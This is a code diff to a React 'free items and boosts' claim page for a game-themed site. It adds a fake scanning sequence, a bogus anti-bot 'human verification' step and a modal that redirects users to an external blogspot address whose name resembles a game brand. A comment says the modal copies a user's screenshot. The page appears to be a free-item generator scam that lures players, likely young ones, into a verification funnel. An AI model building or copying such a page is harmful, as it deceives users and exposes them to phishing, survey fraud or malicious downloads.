@@ -11,6 +11,7 @@ import {
   Flame, 
   Loader2 
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface SpeedEscapePageProps {
   onBack: () => void;
@@ -191,9 +192,9 @@ export const SpeedEscapePage: React.FC<SpeedEscapePageProps> = ({ onBack }) => {
 
     const t3 = setTimeout(() => {
       setScanStep(4);
-      setScanLabel('Awaiting final anti-bot human confirmation...');
+      setScanLabel('Ready for human verification!');
       setModalScreen('ready');
-    }, 3900);
+    }, 2600);
 
     return () => {
       clearTimeout(t1);
@@ -350,15 +351,10 @@ export const SpeedEscapePage: React.FC<SpeedEscapePageProps> = ({ onBack }) => {
             ))}
           </div>
         </section>
-
-        {/* Footer */}
-        <footer className="text-center py-6 border-t border-[#1f2f1f] text-xs text-[#5e7a5e]">
-          © 2026 Speed Keyboard Escape · Free items & boosts Drop Center
-        </footer>
       </main>
 
       {/* Claim / Unlock Item Modal */}
-      {selectedItem && (
+      {selectedItem && modalScreen !== 'ready' && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
           {/* Backdrop */}
           <div 
@@ -489,40 +485,17 @@ export const SpeedEscapePage: React.FC<SpeedEscapePageProps> = ({ onBack }) => {
               </div>
             )}
 
-            {/* SCREEN 3: Ready for final verification */}
-            {modalScreen === 'ready' && (
-              <div className="text-center py-2 space-y-4">
-                <div className="w-16 h-16 rounded-full bg-emerald-950/80 border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
-                  <ShieldCheck className="w-9 h-9" />
-                </div>
-
-                <div>
-                  <h4 className="font-black text-white text-lg">
-                    Almost Done!
-                  </h4>
-                  <p className="text-xs text-[#a0c4a0] mt-1 leading-relaxed">
-                    Your <strong>{selectedItem.name}</strong> is reserved for user <strong>{username}</strong>. Complete the anti-bot verification to release the item to your inventory!
-                  </p>
-                </div>
-
-                <div className="p-3 bg-[#1d2d1d] rounded-2xl border border-emerald-500/30 text-xs text-emerald-300">
-                  Drop Code: <strong>SPEED-ESC-{Math.floor(1000 + Math.random() * 9000)}</strong>
-                </div>
-
-                <button
-                  onClick={() => {
-                    alert(`Congratulations! Item "${selectedItem.name}" claimed successfully for "${username}".`);
-                    handleCloseModal();
-                  }}
-                  className="w-full bg-[#3e7a3e] hover:bg-[#488e48] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-2xl transition-all shadow-[0_4px_0_#1f451f] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
-                >
-                  <CheckCircle2 className="w-4 h-4" />
-                  <span>VERIFY & UNLOCK NOW</span>
-                </button>
-              </div>
-            )}
           </div>
         </div>
+      )}
+
+      {/* Human Verification Modal matching exact user screenshot */}
+      {selectedItem && modalScreen === 'ready' && (
+        <ClaimVerificationModal
+          isOpen={true}
+          onClose={handleCloseModal}
+          redirectUrl="https://riblx-fruit.blogspot.com/"
+        />
       )}
     </div>
   );
